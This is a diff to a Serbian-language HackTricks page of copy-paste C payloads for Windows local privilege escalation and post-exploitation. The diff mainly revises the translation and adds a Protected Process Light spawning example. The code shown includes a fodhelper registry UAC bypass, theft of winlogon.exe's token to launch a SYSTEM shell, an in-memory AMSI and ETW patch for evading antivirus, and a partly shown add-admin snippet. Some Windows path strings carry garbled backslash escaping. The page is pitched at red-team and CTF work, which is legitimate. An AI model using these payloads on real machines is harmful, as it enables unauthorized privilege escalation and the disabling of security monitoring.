@@ -2,13 +2,13 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Ova stranica sakuplja **male, samostalne C isječke** koji su korisni tokom Windows lokalne eskalacije privilegija ili post-eksploatacije. Svaki payload je dizajniran da bude **prijateljski za kopiranje i lepljenje**, zahteva samo Windows API / C runtime, i može se kompajlirati sa `i686-w64-mingw32-gcc` (x86) ili `x86_64-w64-mingw32-gcc` (x64).
+Ova stranica sakuplja **male, samostalne C isječke** koji su korisni tokom Windows Local Privilege Escalation ili post-exploitation. Svaki payload je dizajniran da bude **pogodan za kopiranje i lepljenje**, zahteva samo Windows API / C runtime i može se kompajlirati sa `i686-w64-mingw32-gcc` (x86) ili `x86_64-w64-mingw32-gcc` (x64).
 
-> ⚠️  Ovi payloadi pretpostavljaju da proces već ima minimalne privilegije potrebne za izvršenje akcije (npr. `SeDebugPrivilege`, `SeImpersonatePrivilege`, ili kontekst srednje integriteta za UAC zaobilaženje). Namenjeni su za **red-team ili CTF okruženja** gde je iskorišćavanje ranjivosti dovelo do izvršenja proizvoljnog nativnog koda.
+> ⚠️ Ovi payloads pretpostavljaju da proces već ima minimalne privilegije potrebne za izvršenje akcije (npr. `SeDebugPrivilege`, `SeImpersonatePrivilege`, ili medium-integrity context for a UAC bypass). Namenjeni su za **red-team or CTF settings** where exploiting a vulnerability has landed arbitrary native code execution.
 
 ---
 
-## Dodaj lokalnog administratora
+## Dodaj lokalnog administratorskog korisnika
 ```c
 // i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
 #include <stdlib.h>
@@ -21,13 +21,13 @@ return 0;
 ---
 
 ## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
-Kada se izvrši pouzdani binarni fajl **`fodhelper.exe`**, on pretražuje putanju registra ispod **bez filtriranja `DelegateExecute` glagola**. Postavljanjem naše komande pod tu ključ, napadač može zaobići UAC *bez* preuzimanja fajla na disk.
+Kada se poverljivi binarni fajl **`fodhelper.exe`** pokrene, on proverava sledeću putanju registra **bez filtriranja `DelegateExecute` verb**. Postavljanjem naše komande pod taj ključ, napadač može zaobići UAC *bez* upisivanja fajla na disk.
 
-*Putanja registra koju pretražuje `fodhelper.exe`*
+*Putanja registra koju upituje `fodhelper.exe`*
 ```
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
-Minimalni PoC koji otvara povišeni `cmd.exe`:
+Minimalni PoC koji pokreće povišeni `cmd.exe`:
 ```c
 // x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
 #define _CRT_SECURE_NO_WARNINGS
@@ -61,12 +61,12 @@ system("fodhelper.exe");
 return 0;
 }
 ```
-*Testirano na Windows 10 22H2 i Windows 11 23H2 (zakrpe iz jula 2025). Zaobilaženje i dalje funkcioniše jer Microsoft nije ispravio nedostatak provere integriteta u `DelegateExecute` putanji.*
+*Testirano na Windows 10 22H2 i Windows 11 23H2 (zakrpe od jula 2025). Bypass i dalje radi jer Microsoft nije ispravio nedostatak provere integriteta u `DelegateExecute` putanji.*
 
 ---
 
-## Pokretanje SYSTEM ljuske putem duplikacije tokena (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
-Ako trenutni proces ima **oba** privilegije `SeDebug` i `SeImpersonate` (tipično za mnoge naloge usluga), možete ukrasti token iz `winlogon.exe`, duplirati ga i pokrenuti podignut proces:
+## Pokreni SYSTEM shell dupliciranjem tokena (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
+Ako trenutni proces ima **oba** `SeDebug` i `SeImpersonate` privilegije (tipično za mnoge servisne naloge), možete ukrasti token iz `winlogon.exe`, duplicirati ga i pokrenuti povišen proces:
 ```c
 // x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
 #include <windows.h>
@@ -102,7 +102,7 @@ DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPri
 STARTUPINFOW si = { .cb = sizeof(si) };
 PROCESS_INFORMATION pi = { 0 };
 if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
-L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
+L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
 NULL, NULL, &si, &pi)) {
 CloseHandle(pi.hProcess);
 CloseHandle(pi.hThread);
@@ -114,7 +114,7 @@ if (dupToken) CloseHandle(dupToken);
 return 0;
 }
 ```
-Za dublje objašnjenje kako to funkcioniše, pogledajte:
+Za detaljnije objašnjenje kako to funkcioniše, pogledajte:
 
 {{#ref}}
 sedebug-+-seimpersonate-copy-token.md
@@ -122,8 +122,8 @@ sedebug-+-seimpersonate-copy-token.md
 
 ---
 
-## AMSI i ETW zakrpa u memoriji (Izbegavanje odbrane)
-Većina modernih AV/EDR motora oslanja se na **AMSI** i **ETW** za inspekciju malicioznih ponašanja. Zakrivanje oba interfejsa rano unutar trenutnog procesa sprečava skeniranje skriptnih payload-a (npr. PowerShell, JScript).
+## Patč AMSI i ETW u memoriji (Defence Evasion)
+Većina modernih AV/EDR motora se oslanja na **AMSI** i **ETW** da bi ispitala zlonamerna ponašanja. Patčovanjem oba interfejsa rano unutar trenutnog procesa sprečava se skeniranje payloads zasnovanih na skriptama (npr. PowerShell, JScript).
 ```c
 // gcc -o patch_amsi.exe patch_amsi.c -lntdll
 #define _CRT_SECURE_NO_WARNINGS
@@ -150,12 +150,56 @@ MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
 return 0;
 }
 ```
-*Zaključak iznad je lokalni za proces; pokretanje novog PowerShell-a nakon što se to izvrši će se izvršiti bez AMSI/ETW inspekcije.*
+*Gore navedeni patch važi samo za tekući proces; pokretanje novog PowerShell-a nakon njegove primene će se izvršiti bez AMSI/ETW inspekcije.*
 
 ---
 
-## Reference
+## Kreirajte podređeni proces kao Protected Process Light (PPL)
+Zatražite PPL nivo zaštite za podređeni proces pri kreiranju koristeći `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Ovo je dokumentovan API i uspeće samo ako je ciljni image potpisan za traženu signer class (Windows/WindowsLight/Antimalware/LSA/WinTcb).
+```c
+// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
+#include <windows.h>
+
+int wmain(void) {
+STARTUPINFOEXW si = {0};
+PROCESS_INFORMATION pi = {0};
+si.StartupInfo.cb = sizeof(si);
+
+SIZE_T attrSize = 0;
+InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
+InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);
+
+DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
+UpdateProcThreadAttribute(si.lpAttributeList, 0,
+PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
+&lvl, sizeof(lvl), NULL, NULL);
+
+if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
+EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
+// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
+return 1;
+}
+DeleteProcThreadAttributeList(si.lpAttributeList);
+HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
+CloseHandle(pi.hThread);
+CloseHandle(pi.hProcess);
+return 0;
+}
+```
+Nivoi koji se najčešće koriste:
+- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
+- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
+- `PROTECTION_LEVEL_LSA_LIGHT` (4)
+
+Potvrdite rezultat pomoću Process Explorer/Process Hacker tako što ćete proveriti kolonu Protection.
+
+---
+
+## Izvori
 * Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
 * SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
+* CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
+* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
 
 {{#include ../../banners/hacktricks-training.md}}
